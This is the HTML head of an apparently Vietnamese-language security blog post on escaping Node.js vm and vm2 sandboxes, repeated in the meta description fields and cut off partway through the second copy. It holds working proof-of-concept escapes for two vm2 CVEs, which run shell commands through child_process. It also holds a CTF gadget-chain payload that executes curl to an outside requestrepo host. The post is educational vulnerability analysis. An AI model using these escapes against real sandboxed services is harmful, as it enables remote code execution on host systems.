<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="NodeJS escape VM and some gadgets chaining in NodeJS" />
<meta property="og:locale" content="en" />
<meta name="description" content="NodeJS escape VM and some gadgets chaining in NodeJS Sandbox là gì? Khi chúng ta chạy một số chương trình có thể gây nguy hiểm cho hệ thống thì chúng ta cần một cách để chạy chúng mà không ảnh hưởng đến hệ thống. Đó chính là lý do mà sandbox ra đời. Sandbox là một môi trường ảo được tạo ra hoàn toàn cô lập với máy chính (nhưng vẫn sử dụng tài nguyên của máy chính) để chạy các chương trình mà không ảnh hưởng đến hệ thống. Do đó, bất kỳ ảnh hướng gây hại nào từ code độc hại sẽ chỉ ảnh hưởng lên sandbox không ảnh hướng đến máy chính. Escape VM VM escape xảy ra khi attacker có thể thoát ra ngoài môi trường độc lập kia và thực hiện các lệnh độc hại lên máy chính. Đây là một lỗi rất nguy hiểm vì nó có thể để attacker có khả năng xâm nhập vào máy chính Module VM Sử dụng module node:vm (ngoài ra còn có vm2 ) cho phép lập trình viên biên dịch và chạy code động bên trong ngữ cảnh V8 Vitural Machine, có thể hiểu đơn giản là code được thực thi có global object khác với code gọi nó. Ví dụ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 const vm = require(&#39;node:vm&#39;); const x = 1; const context = { x: 2 }; vm.createContext(context); // tạo ngữ cảnh const code = &#39;x += 40; var y = 17;&#39;; // `x` and `y` are global variables in the context. // Initially, x has the value 2 because that is the value of context.x. vm.runInContext(code, context); console.log(context.x); // 42 console.log(context.y); // 17 console.log(x); console.log(y); // 1; y is not defined. Có nghĩa là code chạy trong context sẽ không ảnh hưởng đến biến ngoài context và ngược lại An insecure JavaScript sandbox vm.runInThisContext(code): Tạo một sandbox trong phạm vi global hiện tại và thực thi mã truyền vào như là tham số. Sandbox này truy cập được vào các thuộc tính của global nhưng không thể truy cập vào các thuộc tính của các module khác 1 2 3 4 5 6 7 8 const vm = require(&#39;vm&#39;); let globalobject = process; const vmResult = vm.runInThisContext(&#39;process&#39;);; if (globalobject === vmResult) { console.log(&#39;VM is running in the global context&#39;); } ///VM is running in the global context 1 2 3 4 5 6 7 const vm = require(&#39;vm&#39;); let localVar = &#39;di&#39;; const vmResult = vm.runInThisContext(&#39;localVar = &quot;box&quot;;&#39;); console.log(&#39;vmResult:&#39;, vmResult); console.log(&#39;localVar:&#39;, localVar); // vmResult: &#39;box&#39;, localVar: &#39;di&#39; vm.createContext([sandbox]): Trước khi sử dụng, cần tạo một đối tượng sandbox, sau đó chuyển đối tượng sandbox này làm tham số cho phương thức (nếu không có, một đối tượng sandbox rỗng sẽ được tạo tự động). V8 (JavaScript Engine) tạo ra một phạm vi mới bên ngoài global hiện tại cho đối tượng sandbox. Lúc này, đối tượng sandbox trở thành đối tượng toàn cục của phạm vi mới được tạo, và bên trong sandbox, không thể truy cập các thuộc tính trong global 1 2 3 4 5 6 7 8 const vm = require(&#39;vm&#39;); global.test = 9; const sandbox = { test : 9}; vm.createContext(sandbox); vm.runInContext(&#39;test = test + 3&#39;, sandbox); console.log(global.test); // 9 console.log(sandbox); // { test: 12 } Hàm vm.runInNewContext(code[, sandbox][, options]) là sự kết hợp của createContext và runInContext. Nó nhận vào mã cần thực thi (code), một đối tượng sandbox và tùy chọn (options). Nói đơn giản là gộp 2 function làm một vm.Script là một lớp trong Node.js cho phép bạn biên dịch và chạy đoạn mã JavaScript trong một ngữ cảnh cụ thể. Các đối tượng của lớp vm.Script chứa các đoạn mã đã được biên dịch trước và có thể được thực thi nhiều lần trong một hoặc nhiều sandbox. script có thể được chạy thông qua runInNewContext Khi thực hiện thoát khỏi sandbox, mục tiêu thường là thực hiện RCE (Remote Code Execution). Trong Node.js, để thực hiện RCE, chúng ta cần truy cập vào đối tượng process. Một khi đã có được đối tượng process, chúng ta có thể sử dụng require để nhập child_process và sau đó dùng child_process để thực thi các lệnh hệ thống. Mặc dù đối tượng process được gắn vào global, khi tạo một ngữ cảnh mới (sử dụng createContext), đối tượng global không còn có thể truy cập được. Vì vậy, mục tiêu cuối cùng là tìm cách đưa đối tượng process từ global vào môi trường sandbox. 1 2 3 const vm = require(&quot;vm&quot;); const test = vm.runInNewContext(`this.constructor.constructor(&#39;return process.env&#39;)()`); console.log(test); hoặc 1 2 3 4 5 const vm = require(&#39;vm&#39;); const sandbox = { test : 1337}; vm.createContext(sandbox); vm.runInContext(`test = this.constructor.constructor(&#39;return process.env&#39;)()`, sandbox); console.log(sandbox) Vậy vì sao chúng ta có thể thoát khỏi sandbox và access được global? Lý do là vì trong đoạn code trên this trỏ đến runInContext ( hoặc runInNewContext), nó không thuộc về sandbox, chúng ta có thể dựa vào cái này để lấy constructor của nó sau đó tiếp tục lấy constructor của nó ta sẽ lấy được Function (cái này là của bên ngoài sandbox). Cuối cùng dựa vào Function mà ta vừa lấy được ta có thể lấy được process Nói một cách đơn giản, quá trình này ta chain các gadget để truy cập đến constructor của Function, sau đó tạo hàm và lấy process. Đây chính là cách đơn giản nhất để thoát khỏi sandbox Sau khi có process thì RCE là chuyện đơn giản Một số trường hợp khác 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const vm = require(&#39;vm&#39;); const script = `(() =&gt; { const a = {}; a.toString = function () { const cc = arguments.callee.caller; const p = (cc.constructor.constructor(&#39;return process&#39;))(); return p.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString(); }; return a; })()`; const sandbox = Object.create(null); const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log(&#39;Hello &#39; + res); Khi this đang là null và không có đối tượng nào khác để tham chiếu, chúng ta có thể tận dụng thuộc tính nội tại của đối tượng hàm, cụ thể là arguments.callee.caller. Thuộc tính này cho phép chúng ta xác định hàm nào đã gọi hàm hiện tại. Trong tình huống này, việc thoát khỏi sandbox (sandbox escape) thực chất là tìm một đối tượng bên ngoài môi trường sandbox và gọi một trong các phương thức của nó. Cách thực hiện là định nghĩa một hàm trong sandbox, sau đó gọi hàm đó từ bên ngoài sandbox. Khi hàm trong sandbox được gọi, thuộc tính arguments.callee.caller sẽ trả về đối tượng hàm từ bên ngoài sandbox. Từ đó, chúng ta có thể khai thác để thực hiện việc thoát khỏi môi trường sandbox. Giải thích đơn giản Tóm lại, muốn escape sandbox thì chúng ta cần access được bất kỳ thứ gì không thuộc sandbox, như 2 ví dụ trên là Function và arguments.callee.caller và từ đó ta có thể làm bất cứ điều gì. Ngoài vm ra thì còn một module khác là vm2 được coi là “bản nâng cấp” của vm. vm2 là một sandbox hổ trợ chạy các unstrusted code với các built-in module của Nodejs. vm2 dùng Proxy để ngăn chặn thoát khỏi sandbox. Tuy nhiên tương tự như vm thì vm2 cũng có thể bị thoát khỏi sandbox nhưng cách thức thoát khỏi nó phức tạp hơn nên ta sẽ đi vào phân tích các CVE gần đây CVE-2023-37466 In vm2 for versions up to 3.9.19, Promise handler sanitization can be bypassed with @@species accessor property allowing attackers to escape the sandbox and run arbitrary code. POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 const {VM} = require(&quot;vm2&quot;); const vm = new VM(); const code = ` async function fn() { (function stack() { new Error().stack; stack(); })(); } p = fn(); p.constructor = { [Symbol.species]: class FakePromise { constructor(executor) { executor( (x) =&gt; x, (err) =&gt; { return err.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;touch pwned&#39;); } ) } } }; p.then(); `; console.log(vm.run(code)); Phân tích Một trạng thái bất thường của máy chính trong ngữ cảnh bất đồng bộ (Promise) sẽ có thể leak object của máy chính ra ngoài, như ở trên ta có thể dựa vào đây để thoát khỏi sandbox và RCE Ban đầu khi mới vào thì Promise.prototype.then đã bị viết đè bằng cách dùng Proxy để khử các tham số mà người dùng cung cấp cho function onRejected Đọc document của ES2022 của Promise.prototype.then có chỉ một đoạn liên quan đến @@species ở đây link 1 2 3 4 5 6 7 When the then method is called with arguments onFulfilled and onRejected, the following steps are taken: 1. Let promise be the this value. 2. If IsPromise(promise) is false, throw a TypeError exception. **3. Let C be ? SpeciesConstructor(promise, %Promise%).** **4. Let resultCapability be ? NewPromiseCapability(C).** **5. Return PerformPromiseThen(promise, onFulfilled, onRejected, resultCapability).** Có 3 đoạn cần chú ý ở trên đó là SpeciesConstructor, NewPromiseCapability và PerformPromiseThen 1 2 3 4 5 6 7 1. Let C be ? Get(O, &quot;constructor&quot;). 2. If C is undefined, return defaultConstructor. 3. If Type(C) is not Object, throw a TypeError exception. 4. Let S be ? Get(C, @@species). 5. If S is either undefined or null, return defaultConstructor. 6. If IsConstructor(S) is true, return S. 7. Throw a TypeError exception. Đây là pesudo code của SpeciesConstructor cả đoạn trên tóm lại là nó sẽ return object @@species và tiếp theo là NewPromiseCapability 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 1. If IsConstructor(C) is false, throw a TypeError exception. 2. NOTE: C is assumed to be a constructor function that supports the parameter conventions of the Promise constructor (see 27.2.3.1). 3. Let promiseCapability be the PromiseCapability Record { [[Promise]]: undefined, [[Resolve]]: undefined, [[Reject]]: undefined }. 4. Let executorClosure be a new Abstract Closure with parameters (resolve, reject) that captures promiseCapability and performs the following steps when called: a. If promiseCapability.[[Resolve]] is not undefined, throw a TypeError exception. b. If promiseCapability.[[Reject]] is not undefined, throw a TypeError exception. c. Set promiseCapability.[[Resolve]] to resolve. d. Set promiseCapability.[[Reject]] to reject. e. Return undefined. 5. Let executor be CreateBuiltinFunction(executorClosure, 2, &quot;&quot;, « »). 6. Let promise be ? Construct(C, « executor »). 7. If IsCallable(promiseCapability.[[Resolve]]) is false, throw a TypeError exception. 8. If IsCallable(promiseCapability.[[Reject]]) is false, throw a TypeError exception. 9. Set promiseCapability.[[Promise]] to promise. 10. Return promiseCapability. Cả đoạn trên ta có thể rút gọn bỏ đi các phần không liên quan đến CVE là như sau NewPromiseCapability cho phép tạo một constructor và gán nó bằng giá trị của @@sepcies, sau đó sử dụng executor là một closure (đại loại là nó có thể access được các biến từ phạm vi bên ngoài nó) nhận 2 xử lý là resolve và reject và gán mỗi giá trị vào resultCapability.[[Resolve]] và resultCapability.[[Reject]]. Tiếp tục ở đoạn PerformPromiseThen, nó có định nghĩa promise.[[PromiseState]] lúc bị rejected 1 2 3 4 5 6 7 8 9 8. Let rejectReaction be the PromiseReaction { [[Capability]]: resultCapability, [[Type]]: Reject, [[Handler]]: onRejectedJobCallback }. 9. If promise.[[PromiseState]] is pending, then ... 10. Else if promise.[[PromiseState]] is fulfilled, then ... 11. Else, a. Assert: The value of promise.[[PromiseState]] is rejected. b. Let reason be promise.[[PromiseResult]]. c. If promise.[[PromiseIsHandled]] is false, perform HostPromiseRejectionTracker(promise, &quot;handle&quot;). d. Let rejectJob be NewPromiseReactionJob(rejectReaction, reason). e. Perform HostEnqueuePromiseJob(rejectJob.[[Job]], rejectJob.[[Realm]]). Trong này có 1 đoạn quan trọng là rejectJob = NewPromiseReactionJob(rejectReaction, reason) vì nó sẽ là điều kiện để chúng ta thực hiện RCE Tiếp tục đọc mã giả của NewPromiseReactionJob 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 1. Let job be a new Job Abstract Closure with no parameters that captures reaction and argument and performs the following steps when called: a. Let promiseCapability be reaction.[[Capability]]. b. Let type be reaction.[[Type]]. c. Let handler be reaction.[[Handler]]. d. **If handler is empty, then** i. If type is Fulfill, let handlerResult be NormalCompletion(argument). ii. Else, 1. Assert: type is Reject. 2. **Let handlerResult be ThrowCompletion(argument).** e. Else, let handlerResult be Completion(HostCallJobCallback(handler, undefined, « argument »)). f. If promiseCapability is undefined, then i. Assert: handlerResult is not an abrupt completion. ii. Return empty. g. Assert: promiseCapability is a PromiseCapability Record. h. **If handlerResult is an abrupt completion, then** i. **Return ? Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »).** i. Else, i. Return ? Call(promiseCapability.[[Resolve]], undefined, « handlerResult.[[Value]] »). Ta sẽ chú ý đến các đoạn d.ii, h.i Nếu handler không là rỗng và type là Reject (nghĩa là promise đang bị từ chối), thì handlerResult sẽ được gán là một hoàn thành kiểu ném lỗi của argument. Điều này thể hiện việc promise đã bị từ chối. Sau đó là Nếu handlerResult là một hoàn thành đột ngột(abrupt completion), thì Trả về ? Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »). Nếu handlerResult là một hoàn thành đột ngột (nghĩa là xảy ra lỗi trong quá trình xử lý), thì cần phải gọi hàm Reject của promiseCapability với giá trị lỗi từ handlerResult. Vậy từ tất cả thứ trên, tóm lại ta có thể escape sandbox như sau: Gọi một function bất đồng bộ để nó throw ra trạng thái bất thường ở máy chính, trả về rejected Promise object Ta sẽ ghi đè constructor của Promise object với thuộc tính của @@species (Symbol.species) với giá trị là executor thừa hưởng từ lớp cha và gọi với 2 hàm xử lý resolve và reject(ta bỏ payload vào đây) Gọi then để trigger Call(promiseCapability.[[Reject]], undefined, « handlerResult.[[Value]] »). và ez RCE CVE-2023-32314 1 A sandbox escape vulnerability exists in vm2 for versions up to 3.9.17. It abuses an unexpected creation of a host object based on the specification of Proxy, and allows RCE via Function in the host context. POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 const { VM } = require(&quot;vm2&quot;); const vm = new VM(); const code = ` const err = new Error(); err.name = { toString: new Proxy(() =&gt; &quot;&quot;, { apply(target, thiz, args) { const process = args.constructor.constructor(&quot;return process&quot;)(); throw process.mainModule.require(&quot;child_process&quot;).execSync(&quot;echo hacked&quot;).toString(); }, }), }; try { err.stack; } catch (stdout) { stdout; } `; console.log(vm.run(code)); Phân tích CVE này nhìn cũng khá giống CVE trên kia nhưng nó đơn giản hơn Khi err.name.toString được gọi ở ErrorPrototypeToString trong prepareStackTrace thì nó lại là trong ngữ cảnh của máy chính error của prepareStackTrace không được xử lý qua cơ chế proxy của vm2 nên nó được gọi thẳng bởi V8 Và còn 1 điều nữa là ở Proxy khi được gọi đến nó có 1 đoạn mã giả như sau 1 2 7. Let argArray be CreateArrayFromList(argumentsList). 8. Return ? Call(trap, handler, « target, thisArgument, argArray »). Khi err.name.toString được gọi thì CreateArrayFromList() sẽ tạo ra argArray ở ngữ cảnh của máy chính sau đó được truyền vào apply(target, thiz, args). Vậy ta có thể tiếp cận được Function ở máy chính. Từ đó RCE Gadgets chaining Gadgets chaining là một kỹ thuật sử dụng các gadgets (một chuỗi các lệnh nhỏ) để thực hiện kết nối chúng lại với nhau. Ví dụ như việc sử dụng các gadgets để thực hiện một hành động như RCE Note: Cách này mình đã đọc được từ writeup của các giải amstrong2024 và TSG2023 và tham khảo của anh shin24 link mình sẽ đính kèm bên dưới 1 2 3 4 5 6 7 toString.constructor.prototype.toString=toString.constructor.prototype.call; var a=[&quot;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://yh9wz5br.requestrepo.com&#39;)&quot;]; a[1]=&quot;x&quot;; b={}; b[Symbol.hasInstance]=a.sort; b[&quot;__proto__&quot;]=a; toString.constructor instanceof b; Giải thích sơ qua về payload này Đầu tiên chúng ta sẽ gọi đến function toString và gán giá trị của function call cho nó Tiếp theo ta tạo một mảng a với giá trị đầu tiên là payload mà ta muốn execute (payload này sẽ được thực thi trong anonymous function) Tiếp theo ta gán giá trị &#39;x&#39; cho a[1] (sẽ giải thích ở bên dưới vì sao có phần này) Sau đó tạo một object b với key là Symbol.hasInstance và value là a.sort Sau đó set __proto__ của b là a Cuối cùng là kiểm tra xem toString.constructor có phải là instance của b (thật ra đoạn này không hẳn là kiểm tra mà là điều kiện để RCE) Trước khi đi vào phần phân tích sâu hơn, mình sẽ giải thích về cách của instanceof hoạt động Syntax 1 object instanceof constructor Toán tử instanceof là toán tử dùng để kiểm tra xem một đối tượng có thuộc lớp nào đó hay không Ví dụ đơn giản như sau 1 2 3 4 class BOX {} let DI = new BOX(); console.log(DI instanceof BOX); //true Ngoài ra nếu constructor (phần bên phải của instanceof) có phương thức Symbol.hasInstance thì nó sẽ được ưu tiên gọi, với object (phần bên trái của instanceof) là tham số truyền vào còn bên phải là this sau đó dùng kết quả để trả về kết quả của instanceof Ví dụ 1: 1 2 3 4 5 6 7 8 9 BOX = {[Symbol.hasInstance]: (dib) =&gt; { // console.log(dib) return dib === &#39;dib&#39; }}; DI = &#39;dib&#39; console.log(DI instanceof BOX); //true Ví dụ 2: 1 2 3 4 5 6 7 8 9 10 a = [&#39;1&#39;,&#39;0&#39;] a.__proto__[&#39;loG&#39;] = function(a) { console.log(&quot;triggered&quot;) } BOX = {[Symbol.hasInstance]: a.loG}; DI = Function console.log(DI instanceof BOX); // &quot;triggered&quot; // console.log(a) Đến phần chính, đi sâu vào giải thích vì sao nó hoạt động 1 toString.constructor instanceof b; Khi câu lệnh này được thực thi thì: Khi instanceof được sử dụng thì nó sẽ tìm kiếm xem b có thuộc tính Symbol.hasInstance không? Nếu có thì sẽ thực thi gọi tới a.sort là this và toString.constructor (AKA Function) là tham số truyền vào Khi a.sort(function sort) được gọi đến thì bình thường thì nó sẽ cố gắng chuyển tất cả các phần tử trong mảng thành string bằng hàm toString() rồi so sánh bằng function truyền vào. Điều này vô tình trigger hàm call() chúng ta đã đổi ở lúc đầu và bây giờ cả array sẽ trở thành parameter của new Function Nói thêm ở phần này về lý do phải set b[__proto__]=a là vì sort là function của array nên chúng ta phải đổi prototype của nó thành array thì sort mới có thể được thực thi và hơn hết khi đó sort sẽ được thực thi trên b, b lúc này là một object nên sort sẽ cố gắng tìm kiếm array trong object này bằng cách tìm kiếm trong prototype của nó khi đó nó sẽ tìm được 1 array trong vì ta set prototype của b là a Giá trị return của new Function này sẽ là một anonymous với a[0] là function và a[1] là parameter 1 2 3 4 (function anonymous(x ) { process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://yh9wz5br.requestrepo.com&#39;) }) Để nói thêm một chút nữa thì flow của chương trình sẽ như sau trigger sort -&gt; sort nhận Function làm tham số -&gt; Function là hàm được sử dụng để ‘so sánh’ các phần tử bên trong mảng -&gt; Mỗi phần từ được chuyển qua string(trigger call function) -&gt; Trả về một anonymouse function -&gt; Cuối cùng giá trị sau khi ‘so sánh’ sẽ được trả về dưới dạng string (trigger call function) Đây là code mô phỏng lại quá trình sort 1 2 3 toString.constructor.prototype.toString=Function.call; Function(a[1].toString(),a[0].toString()).toString();" />
<meta property="og:description" content="NodeJS escape VM and some gadgets chaining in NodeJS Sandbox là gì? Khi chúng ta chạy một số chương trình có thể gây nguy hiểm cho hệ thống thì chúng ta cần một cách để chạy chúng mà không ảnh hưởng đến hệ thống. Đó chính là lý do mà sandbox ra đời. Sandbox là một môi trường ảo được tạo ra hoàn toàn cô lập với máy chính (nhưng vẫn sử dụng tài nguyên của máy chính) để chạy các chương trình mà không ảnh hưởng đến hệ thống. Do đó, bất kỳ ảnh hướng gây hại nào từ code độc hại sẽ chỉ ảnh hưởng lên sandbox không ảnh hướng đến máy chính. Escape VM VM escape xảy ra khi attacker có thể thoát ra ngoài môi trường độc lập kia và thực hiện các lệnh độc hại lên máy chính. Đây là một lỗi rất nguy hiểm vì nó có thể để attacker có khả năng xâm nhập vào máy chính Module VM Sử dụng module node:vm (ngoài ra còn có vm2 ) cho phép lập trình viên biên dịch và chạy code động bên trong ngữ cảnh V8 Vitural Machine, có thể hiểu đơn giản là code được thực thi có global object khác với code gọi nó. Ví dụ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 const vm = require(&#39;node:vm&#39;); const x = 1; const context = { x: 2 }; vm.createContext(context); // tạo ngữ cảnh const code = &#39;x += 40; var y = 17;&#39;; // `x` and `y` are global variables in the context. // Initially, x has the value 2 because that is the value of context.x. vm.runInContext(code, context); console.log(context.x); // 42 console.log(context.y); // 17 console.log(x); console.log(y); // 1; y is not defined. Có nghĩa là code chạy trong context sẽ không ảnh hưởng đến biến ngoài context và ngược lại An insecure JavaScript sandbox vm.runInThisContext(code): Tạo một sandbox trong phạm vi global hiện tại và thực thi mã truyền vào như là tham số. Sandbox này truy cập được vào các thuộc tính của global nhưng không thể truy cập vào các thuộc tính của các module khác 1 2 3 4 5 6 7 8 const vm = require(&#39;vm&#39;); let globalobject = process; const vmResult = vm.runInThisContext(&#39;process&#39;);; if (globalobject === vmResult) { console.log(&#39;VM is running in the global context&#39;); } ///VM is running in the global context 1 2 3 4 5 6 7 const vm = require(&#39;vm&#39;); let localVar = &#39;di&#39;; const vmResult = vm.runInThisContext(&#39;localVar = &quot;box&quot;;&#39;); console.log(&#39;vmResult:&#39;, vmResult); console.log(&#39;localVar:&#39;, localVar); // vmResult: &#39;box&#39;, localVar: &#39;di&#39; vm.createContext([sandbox]): Trước khi sử dụng, cần tạo một đối tượng sandbox, sau đó chuyển đối tượng sandbox này làm tham số cho phương thức (nếu không có, một đối tượng sandbox rỗng sẽ được tạo tự động). V8 (JavaScript Engine) tạo ra một phạm vi mới bên ngoài global hiện tại cho đối tượng sandbox. Lúc này, đối tượng sandbox trở thành đối tượng toàn cục của phạm vi mới được tạo, và bên trong sandbox, không thể truy cập các thuộc tính trong global 1 2 3 4 5 6 7 8 const vm = require(&#39;vm&#39;); global.test = 9; const sandbox = { test : 9}; vm.createContext(sandbox); vm.runInContext(&#39;test = test + 3&#39;, sandbox); console.log(global.test); // 9 console.log(sandbox); // { test: 12 } Hàm vm.runInNewContext(code[, sandbox][, options]) là sự kết hợp của createContext và runInContext. Nó nhận vào mã cần thực thi (code), một đối tượng sandbox và tùy chọn (options). Nói đơn giản là gộp 2 function làm một vm.Script là một lớp trong Node.js cho phép bạn biên dịch và chạy đoạn mã JavaScript trong một ngữ cảnh cụ thể. Các đối tượng của lớp vm.Script chứa các đoạn mã đã được biên dịch trước và có thể được thực thi nhiều lần trong một hoặc nhiều sandbox. script có thể được chạy thông qua runInNewContext Khi thực hiện thoát khỏi sandbox, mục tiêu thường là thực hiện RCE (Remote Code Execution). Trong Node.js, để thực hiện RCE, chúng ta cần truy cập vào đối tượng process. Một khi đã có được đối tượng process, chúng ta có thể sử dụng require để nhập child_process và sau đó dùng child_process để thực thi các lệnh hệ thống. Mặc dù đối tượng process được gắn vào global, khi tạo một ngữ cảnh mới (sử dụng createContext), đối tượng global không còn có thể truy cập được. Vì vậy, mục tiêu cuối cùng là tìm cách đưa đối tượng process từ global vào môi trường sandbox. 1 2 3 const vm = require(&quot;vm&quot;); const test = vm.runInNewContext(`this.constructor.constructor(&#39;return process.env&#39;)()`); console.log(test); hoặc 1 2 3 4 5 const vm = require(&#39;vm&#39;); const sandbox = { test : 1337}; vm.createContext(sandbox); vm.runInContext(`test = this.constructor.constructor(&#39;return process.env&#39;)()`, sandbox); console.log(sandbox) Vậy vì sao chúng ta có thể thoát khỏi sandbox và access được global? Lý do là vì trong đoạn code trên this trỏ đến runInContext ( hoặc runInNewContext), nó không thuộc về sandbox, chúng ta có thể dựa vào cái này để lấy constructor của nó sau đó tiếp tục lấy constructor của nó ta sẽ lấy được Function (cái này là của bên ngoài sandbox). Cuối cùng dựa vào Function mà ta vừa lấy được ta có thể lấy được process Nói một cách đơn giản, quá trình này ta chain các gadget để truy cập đến constructor của Function, sau đó tạo hàm và lấy process. Đây chính là cách đơn giản nhất để thoát khỏi sandbox Sau khi có process thì RCE là chuyện đơn giản Một số trường hợp khác 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const vm = require(&#39;vm&#39;); const script = `(() =&gt; { const a = {}; a.toString = function () { const cc = arguments.callee.caller; const p = (cc.constructor.constructor(&#39;return process&#39;))(); return p.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString(); }; return a; })()`; const sandbox = Object.create(null); const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log(&#39;Hello &#39; + res); Khi this đang là null và không có đối tượng nào khác để tham chiếu, chúng ta có thể tận dụng thuộc tính nội tại của đối tượng hàm, cụ thể là arguments.callee.caller. Thuộc tính này cho phép chúng ta xác định hàm nào đã gọi hàm hiện tại. Trong tình huống này, việc thoát khỏi sandbox (sandbox escape) thực chất là tìm một đối tượng bên ngoài môi trường sandbox và gọi một trong các phương thức của nó. Cách thực hiện là định nghĩa một hàm trong sandbox, sau đó gọi hàm đó từ bên ngoài sandbox. Khi hàm trong sandbox được gọi, thuộc tính arguments.callee.caller sẽ trả về đối tượng hàm từ bên ngoài sandbox. Từ đó, chúng ta có thể khai thác để thực hiện việc thoát khỏi môi trường sandbox. Giải thích đơn giản Tóm lại, muốn escape sandbox thì chúng ta cần access được bất kỳ thứ gì không thuộc sandbox, như 2 ví dụ trên là Function và arguments.callee.caller và từ đó ta có thể làm bất cứ điều gì. Ngoài vm ra thì còn một module khác là vm2 được coi là “bản nâng cấp” của vm. vm2 là một sandbox hổ trợ chạy các unstrusted code với các built-in module của Nodejs. vm2 dùng Proxy để ngăn chặn thoát khỏi sandbox. Tuy nhiên tương tự như vm thì vm2 cũng có thể bị thoát khỏi sandbox nhưng cách thức thoát khỏi nó phức tạp hơn nên ta sẽ đi vào phân tích các CVE gần đây CVE-2023-37466 In vm2 for versions up to 3.9.19, Promise handler sanitization can be bypassed with @@species accessor property allowing attackers to escape the sandbox and run arbitrary code. POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 const {VM} = require(&quot;vm2&quot;); const vm = new VM(); const code = ` async function fn() { (function stack() { new Error().stack; stack(); })(); } p = fn(); p.constructor = { [Symbol.species]: class FakePromise { constructor(executor) { executor( (x) =&gt; x, (err) =&gt; { return err.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;touch pwned&#39;); } ) } } }; p.then(); `; console.log(vm.run(code)); Phân tích Một trạng thái bất thường của máy chính trong ngữ cảnh bất đồng bộ (Promise) sẽ có thể leak object của máy chính ra ngoài, như ở trên ta có thể dựa vào đây để thoát khỏi sandbox và RCE Ban đầu khi mới vào thì Promise.prototype.then đã bị viết đè bằng cách dùng Proxy để khử các tham số mà người dùng cung cấp cho function onRejected Đọc document của ES2022 của Promise.prototype.then có chỉ một đoạn liên quan đến @@species ở đây link 1 2 3 4 5 6 7 When the then method is called with arguments onFulfilled and onRejected, the following steps are taken: 1. Let promise be the this value. 2. If IsPromise(promise) is false, throw a TypeError exception. **3. Let C be ? SpeciesConstructor(promise, %Promise%).** **4. Let resultCapability be ? NewPromiseCapability(C).** **5. Return PerformPromiseThen(promise, onFulfilled, onRejected, resultCapability).** Có 3 đoạn cần chú ý ở trên đó là SpeciesConstructor, NewPromiseCapability và PerformPromiseThen 1 2 3 4 5 6 7 1. Let C be ? Get(O, &quot;constructor&quot;). 2. If C is undefined, return defaultConstructor. 3. If Type(C) is not Object, throw a TypeError exception. 4. Let S be ? Get(C, @@species). 5. If S is either undefined or null, return defaultConstructor. 6. If IsConstructor(S) is true, return S. 7. Throw a TypeError exception. Đây là pesudo code của SpeciesConstructor cả đoạn trên tóm lại là nó sẽ return object @@species và tiếp theo là NewPromiseCapability 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 1. If IsConstructor(C) is false, throw a TypeError exception. 2. NOTE: C is assumed to be a constructor function that supports the parameter conventions of the Promise constructor (see 27.2.3.1). 3. Let promiseCapability be the PromiseCapability Record { [[Promise]]: undefined, [[Resolve]]: undefined, [[Reject]]: undefined }. 4. Let executorClosure be a new Abstract Closure with parameters (resolve, reject) that captures promiseCapability and performs the following steps when called: a. If promiseCapability.[[Resolve]] is not undefined, throw a TypeError exception. b. If promiseCapability.[[Reject]] is not undefined, throw a TypeError exception. c. Set promiseCapability.[[Resolve]] to resolve. d. Set promiseCapability.[[Reject]] to reject. e. Return undefined. 5. Let executor be CreateBuiltinFunction(executorClosure, 2, &quot;&quot;, « »). 6. Let promise be ? Construct(C, « executor »). 7. If IsCallable(promiseCapability.[[Resolve]]) is false, throw a TypeError exception. 8. If IsCallable(promiseCapability.[[Reject]]) is false, throw a TypeError exception. 9. Set promiseCapability.[[Promise]] to promise. 10. Return promiseCapability. Cả đoạn trên ta có thể rút gọn bỏ đi các phần không liên quan đến CVE là như sau NewPromiseCapability cho phép tạo một constructor và gán nó bằng giá trị của @@sepcies, sau đó sử dụng executor là một closure (đại loại là nó có thể access được các biến từ phạm vi bên ngoài nó) nhận 2 xử lý là resolve và reject và gán mỗi giá trị vào resultCapability.[[Resolve]] và resultCapability.[[Reject]]. Tiếp tục ở đoạn PerformPromiseThen, nó có định nghĩa promise.[[PromiseState]] lúc bị rejected 1 2 3 4 5 6 7 8 9 8. Let rejectReaction be the PromiseReaction { [[Capability]]: resultCapability, [[Type]]: Reject, [[Handler]]: onRejectedJobCallback }. 9. If promise.[[PromiseState]] is pending, then ... 10. Else if promise.[[PromiseState]] is fulfilled, then ... 11. Else, a. Assert: The value of promise.[[PromiseState]] is rejected. b. Let reason be promise.[[PromiseResult]]. c. If promise.[[PromiseIsHandled]] is false, perform HostPromiseRejectionTracker(promise, &quot;handle&quot;). d. Let rejectJob be NewPromiseReactionJob(rejectReaction, reason). e. Perform 